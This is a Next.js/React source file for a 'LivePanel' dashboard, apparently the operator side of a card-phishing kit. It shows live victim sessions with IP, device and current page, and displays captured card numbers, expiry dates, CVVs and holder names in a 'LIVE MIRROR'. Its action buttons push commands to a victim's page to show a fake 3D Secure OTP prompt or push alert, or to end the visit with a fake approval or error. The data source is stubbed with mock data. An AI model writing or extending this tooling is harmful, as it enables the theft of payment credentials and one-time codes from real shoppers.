"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { ref, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import { Smartphone, Monitor, CreditCard, Bell, CheckCircle, XCircle, Lock, MapPin, Globe } from "lucide-react";
import CardVisual from "@/components/CardVisual";

interface SessionData {
    id: string;
    ip: string;
    ua: string;
    device: string;
    card?: string;
    name?: string;
    cvv?: string;
    expiry?: string;
    status: "active" | "success" | "failed";
    lastActive: number;
    currentLocation?: string;
}

export default function LivePanel() {
    const params = useParams();
    const projectId = params.projectId as string;
    const [sessions, setSessions] = useState<SessionData[]>([]);
    const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

    // Mock data for UI testing if Firebase is not connected
    useEffect(() => {
        // In a real scenario, this would be the Firebase listener
        // const sessionsRef = ref(db, `projects/${projectId}/sessions`);
        // return onValue(sessionsRef, (snapshot) => { ... });

        // For now, let's populate with some dummy data to show the UI
        setSessions([
            {
                id: "sess_123",
                ip: "192.168.1.1",
                ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
                device: "Mobile (iPhone)",
                card: "4242424242424242",
                name: "JOHN DOE",
                cvv: "123",
                expiry: "12/25",
                status: "active",
                lastActive: Date.now(),
                currentLocation: "/shop/product/nike-air-max"
            }
        ]);
        setSelectedSessionId("sess_123");
    }, [projectId]);

    const sendCommand = async (command: string) => {
        if (!selectedSessionId) return;
        // await update(ref(db, `projects/${projectId}/sessions/${selectedSessionId}`), { command });
        console.log(`Sending command: ${command} to ${selectedSessionId}`);
    };

    const selectedSession = sessions.find(s => s.id === selectedSessionId);

    return (
        <div className="flex h-screen bg-[#0f111a] text-white overflow-hidden font-sans">
            {/* Sidebar - Session List */}
            <div className="w-80 border-r border-white/10 bg-[#151923] flex flex-col">
                <div className="p-4 border-b border-white/10 bg-[#1a1f2e]">
                    <h2 className="font-bold text-sm uppercase tracking-wider flex items-center gap-2 text-blue-400">
                        <ActivityIcon className="w-4 h-4" />
                        Live Visitors
                    </h2>
                </div>
                <div className="flex-1 overflow-y-auto">
                    {sessions.map((session) => (
                        <div
                            key={session.id}
                            onClick={() => setSelectedSessionId(session.id)}
                            className={`p-4 border-b border-white/5 cursor-pointer hover:bg-white/5 transition-colors ${selectedSessionId === session.id ? "bg-blue-600/10 border-l-2 border-l-blue-500" : ""
                                }`}
                        >
                            <div className="flex justify-between items-start mb-2">
                                <span className="font-mono text-xs text-gray-400">{session.ip}</span>
                                <span className="text-[10px] font-bold px-1.5 py-0.5 bg-green-500/20 text-green-400 rounded">ONLINE</span>
                            </div>
                            <div className="flex items-center gap-2 text-sm font-medium mb-1 text-gray-200">
                                {session.device.includes("Mobile") ? <Smartphone className="w-3 h-3" /> : <Monitor className="w-3 h-3" />}
                                {session.device}
                            </div>
                            <div className="flex items-center gap-1 text-xs text-blue-400 truncate mt-2">
                                <Globe className="w-3 h-3" />
                                {session.currentLocation || "/"}
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            {/* Main Content - Live View */}
            <div className="flex-1 flex flex-col bg-[#0f111a]">
                {selectedSession ? (
                    <>
                        <header className="h-16 border-b border-white/10 bg-[#151923] flex items-center justify-between px-6 shadow-md">
                            <div className="flex items-center gap-4">
                                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
                                <h1 className="text-lg font-medium text-gray-200">Session ID: <span className="font-mono text-blue-400">{selectedSession.id}</span></h1>
                            </div>
                            <div className="flex items-center gap-2 text-sm text-gray-400 bg-white/5 px-3 py-1.5 rounded-full">
                                <MapPin className="w-4 h-4" />
                                Current Page: <span className="text-white font-mono">{selectedSession.currentLocation}</span>
                            </div>
                        </header>

                        <main className="flex-1 p-8 grid grid-cols-1 lg:grid-cols-2 gap-8 overflow-y-auto">

                            {/* Left Column: Visuals */}
                            <div className="space-y-8">
                                {/* Card Visual Mirror */}
                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-8 shadow-xl relative overflow-hidden group">
                                    <div className="absolute top-0 right-0 p-4 opacity-50 group-hover:opacity-100 transition-opacity">
                                        <div className="text-xs font-mono text-blue-400 border border-blue-400/30 px-2 py-1 rounded">LIVE MIRROR</div>
                                    </div>

                                    <div className="transform scale-90 origin-center">
                                        <CardVisual
                                            cardNumber={selectedSession.card || ""}
                                            cardHolder={selectedSession.name || ""}
                                            expiry={selectedSession.expiry || ""}
                                            cvv={selectedSession.cvv || ""}
                                        />
                                    </div>
                                </div>

                                {/* Raw Data */}
                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Captured Data</h3>
                                    <div className="space-y-3 font-mono text-sm">
                                        <div className="flex justify-between border-b border-white/5 pb-2">
                                            <span className="text-gray-400">Card Number</span>
                                            <span className="text-white">{selectedSession.card || "---"}</span>
                                        </div>
                                        <div className="flex justify-between border-b border-white/5 pb-2">
                                            <span className="text-gray-400">Expiry</span>
                                            <span className="text-white">{selectedSession.expiry || "--/--"}</span>
                                        </div>
                                        <div className="flex justify-between border-b border-white/5 pb-2">
                                            <span className="text-gray-400">CVV</span>
                                            <span className="text-red-400">{selectedSession.cvv || "---"}</span>
                                        </div>
                                        <div className="flex justify-between pt-2">
                                            <span className="text-gray-400">Holder</span>
                                            <span className="text-white">{selectedSession.name || "---"}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Right Column: Controls */}
                            <div className="space-y-6">
                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-6">Live Actions</h3>

                                    <div className="grid grid-cols-2 gap-4">
                                        <button
                                            onClick={() => sendCommand("OTP")}
                                            className="group relative overflow-hidden p-6 rounded-xl bg-blue-600/10 hover:bg-blue-600/20 border border-blue-500/30 transition-all text-left"
                                        >
                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
                                                <Lock className="w-6 h-6 text-blue-400" />
                                            </div>
                                            <div className="font-bold text-blue-400 text-lg mb-1">3D Secure</div>
                                            <div className="text-xs text-blue-300/60">Trigger OTP Modal</div>
                                        </button>

                                        <button
                                            onClick={() => sendCommand("PUSH")}
                                            className="group relative overflow-hidden p-6 rounded-xl bg-purple-600/10 hover:bg-purple-600/20 border border-purple-500/30 transition-all text-left"
                                        >
                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
                                                <Bell className="w-6 h-6 text-purple-400" />
                                            </div>
                                            <div className="font-bold text-purple-400 text-lg mb-1">Push Notif</div>
                                            <div className="text-xs text-purple-300/60">Send Mobile Alert</div>
                                        </button>

                                        <button
                                            onClick={() => sendCommand("SUCCESS")}
                                            className="group relative overflow-hidden p-6 rounded-xl bg-green-600/10 hover:bg-green-600/20 border border-green-500/30 transition-all text-left"
                                        >
                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
                                                <CheckCircle className="w-6 h-6 text-green-400" />
                                            </div>
                                            <div className="font-bold text-green-400 text-lg mb-1">Approve</div>
                                            <div className="text-xs text-green-300/60">End with Success</div>
                                        </button>

                                        <button
                                            onClick={() => sendCommand("FAIL")}
                                            className="group relative overflow-hidden p-6 rounded-xl bg-red-600/10 hover:bg-red-600/20 border border-red-500/30 transition-all text-left"
                                        >
                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
                                                <XCircle className="w-6 h-6 text-red-400" />
                                            </div>
                                            <div className="font-bold text-red-400 text-lg mb-1">Decline</div>
                                            <div className="text-xs text-red-300/60">End with Error</div>
                                        </button>
                                    </div>
                                </div>

                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Device Fingerprint</h3>
                                    <div className="bg-[#0f111a] rounded-lg p-4 font-mono text-xs text-gray-400 break-all border border-white/5">
                                        {selectedSession.ua}
                                    </div>
                                </div>
                            </div>
                        </main>
                    </>
                ) : (
                    <div className="flex-1 flex items-center justify-center text-gray-500 flex-col gap-4">
                        <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center">
                            <ActivityIcon className="w-8 h-8 opacity-50" />
                        </div>
                        <p>Select a live session to monitor</p>
                    </div>
                )}
            </div>
        </div>
    );
}

function ActivityIcon({ className }: { className?: string }) {
    return (
        <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M22 12h-4l-3 9L9 3l-3 9H2" />
        </svg>
    );
}
